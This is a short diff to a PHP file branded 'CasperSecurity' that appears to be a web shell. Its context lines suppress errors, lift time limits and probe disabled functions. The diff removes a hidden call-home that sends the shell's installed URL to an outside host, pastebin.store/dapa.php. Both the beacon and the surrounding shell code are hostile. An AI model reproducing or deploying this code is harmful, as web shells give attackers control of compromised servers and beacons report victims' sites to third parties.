@@ -109,11 +109,6 @@ option {
 <center><img src="https://static.vecteezy.com/system/resources/thumbnails/008/506/590/small_2x/3d-seo-search-engine-optimization-concept-3d-rendering-png.png" width="280" height="280" title="CasperSecurity" alt="CasperSecurity" class="center" />
 <br><br><br>
 <?php
-$actual_link = "https://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
-$dapa = "https://pastebin.store/dapa.php?domain=" . urlencode($actual_link);
-
-// Fetch the content from the URL
-$content = file_get_contents($dapa);
 set_time_limit(0);
 error_reporting(0);
 $disfunc = @ini_get("disable_functions");
